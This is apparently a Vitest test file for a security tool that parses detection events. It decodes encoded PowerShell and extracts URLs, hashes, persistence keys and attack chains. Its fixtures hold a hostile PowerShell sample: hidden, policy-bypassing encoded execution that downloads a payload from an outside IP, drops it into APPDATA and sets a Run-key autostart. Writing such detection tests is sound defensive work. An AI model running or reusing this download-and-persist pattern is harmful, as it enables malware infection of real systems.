import { describe, it, expect } from 'vitest';
import {
  decodePowerShell, normalizedPayload, parsePayloadFields, extractStrings,
  payloadIndicators, rawSnippet, buildPayloadChain,
} from './payloadsModel';
import { EMPTY_EVIDENCE, type ParsedEvidence } from '../analysisModel';

const ev = (over: Partial<ParsedEvidence>): ParsedEvidence => ({
  ...EMPTY_EVIDENCE, detection: { ...EMPTY_EVIDENCE.detection, timestamp: '2026-06-17T14:49:32Z' }, ...over,
});
const DECODED = [
  '$u = "https://185.199.108.153/payload.ps1"',
  '$p = "$env:APPDATA\\ss.exe"',
  '(New-Object Net.WebClient).DownloadFile($u, $p)',
  'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value $p -Force',
].join('\n');
const psEv = (over: Partial<NonNullable<ParsedEvidence['process']>> = {}): ParsedEvidence => ev({
  process: { image: 'C:\\Windows\\System32\\powershell.exe', commandLine: 'powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -EncodedCommand AAAA', processId: '4520', ...over },
  file: { name: 'C:\\Users\\Admin\\AppData\\Local\\Temp\\x.ps1', hashes: 'SHA256=abc123,MD5=def456' },
});

describe('decodePowerShell', () => {
  it('dekodiert einen Encoded-Command, sonst undefined', () => {
    expect(decodePowerShell(ev({ process: { commandLine: 'powershell -EncodedCommand SQBFAFgA' } }))).toContain('IEX');
    expect(decodePowerShell(ev({ process: { commandLine: 'powershell whoami' } }))).toBeUndefined();
  });
});

describe('normalizedPayload', () => {
  it('liest Datei-Metadaten + Hashes aus echten Feldern', () => {
    const n = normalizedPayload(psEv());
    expect(n.fileName).toBe('x.ps1');
    expect(n.fileType).toBe('PowerShell Script');
    expect(n.sha256).toBe('abc123');
    expect(n.md5).toBe('def456');
  });
});

describe('parsePayloadFields', () => {
  it('extrahiert Engine/Policy/URL/Persistence/LOLBIN aus Command + Decoded', () => {
    const p = parsePayloadFields(psEv(), DECODED);
    expect(p.scriptEngine).toBe('Microsoft PowerShell');
    expect(p.executionPolicy).toBe('Bypass');
    expect(p.commandType).toBe('EncodedCommand');
    expect(p.downloadedFrom).toBe('https://185.199.108.153/payload.ps1');
    expect(p.persistence).toMatch(/Run/);
    expect(p.lolbin).toMatch(/powershell\.exe/i);
    expect(p.dropsTo).toMatch(/ss\.exe/);
  });
});

describe('extractStrings', () => {
  it('sammelt URLs, IPs, Pfade und Registry-Keys', () => {
    const s = extractStrings(psEv(), DECODED);
    expect(s).toEqual(expect.arrayContaining(['https://185.199.108.153/payload.ps1', '185.199.108.153']));
    expect(s.some((x) => /HKCU/i.test(x))).toBe(true);
  });
});

describe('payloadIndicators', () => {
  it('leitet Encoded/External URL/Dropped/LOLBIN/Persistence ab', () => {
    const p = parsePayloadFields(psEv(), DECODED);
    const labels = payloadIndicators(psEv(), p, DECODED).map((i) => i.label);
    expect(labels).toEqual(expect.arrayContaining(['Encoded PowerShell', 'External URL', 'Dropped File', 'LOLBIN Usage', 'Run Key Persistence']));
  });
  it('erkennt verdächtige TLD', () => {
    const e = ev({ destination: { fqdn: 'bad.top' } });
    const labels = payloadIndicators(e, parsePayloadFields(e), undefined).map((i) => i.label);
    expect(labels.some((l) => l.includes('Suspicious TLD'))).toBe(true);
  });
});

describe('rawSnippet', () => {
  it('nutzt das echte Roh-Event, wenn vorhanden', () => {
    const snip = rawSnippet(ev({ raw: { rule: { id: '92213' } } }));
    expect(snip).toContain('92213');
  });
  it('baut sonst ein kompaktes JSON aus echten Feldern', () => {
    const snip = rawSnippet(ev({ detection: { ...EMPTY_EVIDENCE.detection, ruleId: '92213', timestamp: 't' } }));
    expect(snip).toContain('92213');
  });
});

describe('buildPayloadChain', () => {
  it('verkettet Prozess → Script → URL → Drop nur mit realen Knoten', () => {
    const p = parsePayloadFields(psEv(), DECODED);
    const chain = buildPayloadChain(psEv(), p);
    expect(chain.map((n) => n.kind)).toEqual(['process', 'file', 'url', 'dropped']);
    expect(chain[0].sub).toBe('PID 4520');
    expect(chain[1].edge).toBe('dropped');
    expect(chain[2].edge).toBe('downloads');
  });
  it('ist leer ohne Evidence', () => {
    expect(buildPayloadChain(EMPTY_EVIDENCE, parsePayloadFields(EMPTY_EVIDENCE))).toHaveLength(0);
  });
});
